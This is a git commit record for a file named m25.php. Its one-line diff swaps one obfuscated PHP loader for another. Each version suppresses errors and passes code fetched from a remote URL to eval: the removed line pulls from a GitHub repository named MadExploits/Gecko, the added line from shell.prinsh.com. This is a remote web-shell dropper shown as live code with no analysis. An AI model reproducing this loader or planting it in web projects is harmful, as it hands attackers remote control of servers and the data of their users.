d341aa784794fae2f55e8641dbe65be7d20a6f86
fontiers <166890984+fontiers@users.noreply.github.com>
2025-02-19 19:15:30 +0700

    Update m25.php

--- m25.php
+++ m25.php
@@ -1,1 +1,1 @@
-<?=/****/@/*55555*/null; /******/@/*55555*/error_reporting(0);/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/MadExploits/Gecko/refs/heads/main/gecko-new.php"))?>
+<?=/****/@/*55555*/null; /******/@/*55555*/error_reporting(0);/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://shell.prinsh.com/Nathan/gelay.txt"))?>
